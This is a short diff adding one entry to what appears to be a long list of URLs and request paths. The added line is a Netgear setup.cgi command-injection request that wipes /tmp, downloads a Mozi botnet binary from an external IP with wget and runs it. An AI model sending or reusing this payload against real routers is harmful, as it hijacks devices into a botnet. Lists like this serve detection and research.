@@ -24983,3 +24983,4 @@ packetsdatabase.com:443
 /jdkpvmtp.php?Fox=d3wL7
 rtsp://example.com
 sip:nm
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://125.45.67.252:58982/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
